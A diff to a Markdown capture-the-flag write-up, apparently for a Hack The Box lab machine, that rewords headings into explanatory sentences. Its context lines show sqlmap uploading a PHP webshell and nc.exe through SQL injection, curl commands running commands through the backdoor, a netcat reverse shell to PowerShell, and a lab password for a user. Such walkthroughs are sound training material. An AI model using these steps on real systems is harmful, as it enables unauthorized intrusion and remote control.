@@ -118,7 +118,7 @@ By posting a single quote, we can find that this search form is suffering SQLi.
 ![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-08-23/2020-08-22-17-00-44.png)
 ![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-08-23/2020-08-22-17-01-47.png)
 
-Getting additional information using SQLmap.<br>
+Getting additional information using `sqlmap`.<br>
 First, create the following file from Burp Suite.
 ```shell
 root@kali:~# cat request.txt 
@@ -261,7 +261,7 @@ do you want confirmation that the local file '/usr/share/webshells/php/simple-ba
 [*] ending @ 19:06:05 /2020-08-22/
 ```
 
-#### Accessing webshell
+To confirm if we uploaded our webshell correctly, we use `curl` command.
 ```shell
 root@kali:~# curl http://10.10.10.167/backdoor.php?cmd=whoami
 <!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->
@@ -270,7 +270,7 @@ root@kali:~# curl http://10.10.10.167/backdoor.php?cmd=whoami
 </pre>
 ```
 
-#### Uploading nc.exe
+Next, upload `nc.exe` to get a reverse shell.
 ```shell
 root@kali:~# sqlmap -r request.txt --file-write=/usr/share/windows-binaries/nc.exe --file-dest=C:/inetpub/wwwroot/nc.exe
 
@@ -283,7 +283,8 @@ do you want confirmation that the local file '/usr/share/windows-binaries/nc.exe
 [*] ending @ 19:23:18 /2020-08-22/
 ```
 
-#### Finding uploaded nc.exe in the directory `C:\inetpub\wwwroot`
+Using the webshell we uploaded, we can execute `dir` command.<br>
+The uploaded `nc.exe` is in the folder `C:\inetpub\wwwroot`.
 ```shell
 root@kali:~# curl http://10.10.10.167/backdoor.php?cmd=dir+C:\\inetpub\\wwwroot
 <!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->
@@ -318,7 +319,8 @@ root@kali:~# curl http://10.10.10.167/backdoor.php?cmd=dir+C:\\inetpub\\wwwroot
 </pre>
 ```
 
-#### Spawning a shell
+Now we finished preparation for getting a reverse shell.<br>
+Launch a netcat listener and execute the following `curl` command.
 ```shell
 root@kali:~# nc -nlvp 4443
 listening on [any] 4443 ...
@@ -328,7 +330,8 @@ listening on [any] 4443 ...
 root@kali:~# curl http://10.10.10.167/backdoor.php?cmd=C:\\inetpub\\wwwroot\\nc.exe+-e+powershell.exe+10.10.14.42+4443
 ```
 
-#### shell
+The target machine spawns a PowerShell session and send back to our localhost as `nt authority\iusr`.<br>
+However, we still can't get `user.txt` and need a lateral movement.
 ```shell
 root@kali:~# nc -nlvp 4443
 listening on [any] 4443 ...
@@ -340,8 +343,6 @@ PS C:\inetpub\wwwroot> whoami
 whoami
 nt authority\iusr
 ```
-
-#### Hector not allowed
 ```shell
 PS C:\users\Hector> ls
 ls
@@ -353,13 +354,13 @@ At line:1 char:1
     + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
 ```
 
-#### Hostname
+We already have a password `l33th4x0rhector` for `Hector`.<br>
+To achieve an user shell as `Hector`, we still need the hostname of this machine.
 ```shell
 PS C:\users\Hector> hostname
 hostname
 Fidelity
 ```
-
 
 #### Command Execution as hector
 ```shell
